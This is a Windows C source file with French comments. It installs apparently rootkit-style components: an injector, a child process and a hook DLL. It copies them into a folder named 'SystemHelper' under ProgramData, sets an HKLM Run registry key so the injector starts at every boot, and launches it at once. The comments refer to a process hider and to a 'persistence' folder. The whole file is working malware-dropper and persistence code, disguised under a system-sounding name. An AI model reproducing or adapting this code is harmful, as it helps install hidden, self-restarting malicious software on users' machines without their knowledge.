#include <windows.h>
#include <shlobj.h>
#include <wchar.h>
#include <stdio.h>

BOOL CreateFolderIfNotExist(LPCWSTR path) {
    if (CreateDirectoryW(path, NULL)) return TRUE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) return TRUE;
    return FALSE;
}

BOOL CopyFileToDestination(LPCWSTR sourcePath, LPCWSTR destPath) {
    return CopyFileW(sourcePath, destPath, FALSE);
}

BOOL SetHKLMRunEntry(LPCWSTR name, LPCWSTR command) {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return FALSE;

    RegSetValueExW(hKey, name, 0, REG_SZ,
        (const BYTE*)command, (DWORD)((wcslen(command) + 1) * sizeof(WCHAR)));
    RegCloseKey(hKey);
    return TRUE;
}

BOOL IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    WCHAR currentDir[MAX_PATH];
    GetModuleFileNameW(NULL, currentDir, MAX_PATH);

    // Extraire le répertoire du programme actuel
    WCHAR* lastBackslash = wcsrchr(currentDir, L'\\');
    if (lastBackslash) *lastBackslash = L'\0';

    WCHAR programData[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, programData);

    WCHAR persistenceDir[MAX_PATH];
    swprintf(persistenceDir, L"%s\\SystemHelper", programData);

    WCHAR currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    // Vérifier si on s'exécute depuis le dossier de persistance
    if (wcsstr(currentExePath, persistenceDir) != NULL) {
        // On est déjà dans le dossier de persistance, on ne fait rien
        return 0;
    }

    // MODE INSTALLATION
    if (!IsRunAsAdmin()) {
        MessageBoxW(NULL,
            L"Ce programme nécessite des droits administrateur pour l'installation système.\n\n"
            L"Relancez-le en tant qu'administrateur.",
            L"Droits Administrateur Requis",
            MB_OK | MB_ICONWARNING);
        return 1;
    }

    // Créer le dossier de persistance
    if (!CreateFolderIfNotExist(persistenceDir)) {
        MessageBoxW(NULL, L"Échec de création du dossier!", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Chemins des fichiers SOURCE
    WCHAR injectorSource[MAX_PATH];
    swprintf(injectorSource, L"%s\\injector.exe", currentDir);

    WCHAR process_childSource[MAX_PATH];
    swprintf(process_childSource, L"%s\\process_child.exe", currentDir);

    WCHAR hookDllSource[MAX_PATH];
    swprintf(hookDllSource, L"%s\\hook2.dll", currentDir);

    // Chemins des fichiers DESTINATION
    WCHAR injectorDest[MAX_PATH];
    swprintf(injectorDest, L"%s\\injector.exe", persistenceDir);

    WCHAR process_childDest[MAX_PATH];
    swprintf(process_childDest, L"%s\\process_child.exe", persistenceDir);

    WCHAR hookDllDest[MAX_PATH];
    swprintf(hookDllDest, L"%s\\hook2.dll", persistenceDir);

    // Copier injector.exe
    if (!CopyFileToDestination(injectorSource, injectorDest)) {
        MessageBoxW(NULL, L"Échec de copie de injector.exe!", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Copier process_child.exe
    if (!CopyFileToDestination(process_childSource, process_childDest)) {
        MessageBoxW(NULL, L"Échec de copie de payload.exe!", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Copier hook2.dll
    if (!CopyFileToDestination(hookDllSource, hookDllDest)) {
        MessageBoxW(NULL, L"Échec de copie de hook2.dll!", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Configurer la persistance registre pour lancer DIRECTEMENT processhider.exe
    WCHAR cmd[MAX_PATH * 2];
    swprintf(cmd, L"\"%s\"", injectorDest);

    if (!SetHKLMRunEntry(L"SystemHelper", cmd)) {
        MessageBoxW(NULL, L"Échec de modification du registre!", L"Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Lancer immédiatement processhider.exe depuis le nouveau dossier - MODE VISIBLE
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    // IMPORTANT: Pas de SW_HIDE pour voir le PCB !
    if (CreateProcessW(injectorDest, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE,  // ← Affiche la console
        NULL, persistenceDir, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        // Attendre un peu pour voir la sortie
        Sleep(5000);
    }

    // Message de confirmation
    WCHAR message[512];
    swprintf(message,
        L"Installation terminée!\n\n"
        L"Tous les fichiers ont été copiés:\n"
        L"- injector.exe\n"
        L"- process_child.exe\n"
        L"- hook2.dll\n\n"
        L"Emplacement: %s\n\n"
        L"Le programme démarrera automatiquement au prochain boot.",
        persistenceDir);

    MessageBoxW(NULL, message, L"Installation Réussie", MB_OK | MB_ICONINFORMATION);
    return 0;
}